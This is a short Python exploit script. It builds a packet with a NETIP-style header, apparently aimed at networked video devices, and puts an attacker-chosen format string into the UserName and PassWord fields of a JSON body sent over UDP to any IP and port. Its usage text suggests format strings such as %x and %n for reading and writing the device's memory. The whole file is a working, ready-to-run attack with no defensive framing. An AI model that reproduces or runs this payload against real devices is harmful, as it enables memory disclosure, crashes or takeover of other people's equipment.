#!/usr/bin/env python3

import socket
import sys
import json
import struct

def create_malicious_payload(format_string):
    # Create NETIP header
    netip_header = struct.pack('!HHHHHHHHHH',
        0xFA05,  # Magic
        0x0000,  # Version
        0x0000,  # Command
        0x0000,  # Length
        0x0000,  # Session ID
        0x0000,  # Sequence
        0x0000,  # Reserved
        0x0000,  # Reserved
        0x0000,  # Reserved
        0x0000   # Reserved
    )

    # Create JSON payload with format string in both fields
    payload = {
        "NetWork.NetCommon": {
            "UserName": format_string,  # Example 1: Direct format string
            "PassWord": format_string,  # Example 2: Indirect format string
            "HostName": "test",
            "MAC": "00:00:00:00:00:00",
            "HostIP": "0x0100007f",
            "TCPPort": 34569,
            "ChannelNum": 1,
            "SN": "TEST123",
            "Version": "1.0.0",
            "BuildDate": "2024-01-01 00:00:00"
        }
    }

    # Convert to JSON string
    json_str = json.dumps(payload)
    
    # Combine header and payload
    return netip_header + json_str.encode()

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <ip> <port> <format_string>")
        print("Example format strings:")
        print("  %x%x%x%x - Print memory contents")
        print("  %n%n%n%n - Write to memory")
        print("  %s%s%s%s - String format")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    format_string = sys.argv[3]

    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Create and send payload
    payload = create_malicious_payload(format_string)
    sock.sendto(payload, (ip, port))
    
    print(f"Sent format string payload to {ip}:{port}")
    print(f"Format string: {format_string}")

if __name__ == "__main__":
    main() 